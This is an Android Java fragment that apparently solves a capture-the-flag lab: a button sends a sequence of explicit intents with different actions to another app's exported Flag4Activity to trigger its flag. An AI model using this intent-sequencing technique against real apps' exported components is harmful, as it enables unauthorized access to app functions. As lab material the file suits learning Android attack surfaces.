package com.appdev.intentattacks;

import android.content.ComponentName;
import android.content.Intent;
import android.os.Bundle;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.widget.Button;
import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.fragment.app.Fragment;

public class Flag4Fragment extends Fragment {
    @Nullable
    @Override
    public View onCreateView(@NonNull LayoutInflater inflater, @Nullable ViewGroup container, @Nullable Bundle savedInstanceState) {
        View view = inflater.inflate(R.layout.fragment_flag4, container, false);
        Button launchButton = view.findViewById(R.id.btnLaunchFlag4);
        launchButton.setOnClickListener(v -> {
            Intent intent = new Intent();
            intent.setComponent(new ComponentName("io.hextree.attacksurface", "io.hextree.attacksurface.activities.Flag4Activity"));
            // It works when I reverse the order I don't know why.
            intent.setAction(null);
            startActivity(intent);
            intent.setAction("GET_FLAG_ACTION");
            startActivity(intent);
            intent.setAction("BUILD_ACTION");
            startActivity(intent);
            intent.setAction("PREPARE_ACTION");
            startActivity(intent);
        });
        return view;
    }
} 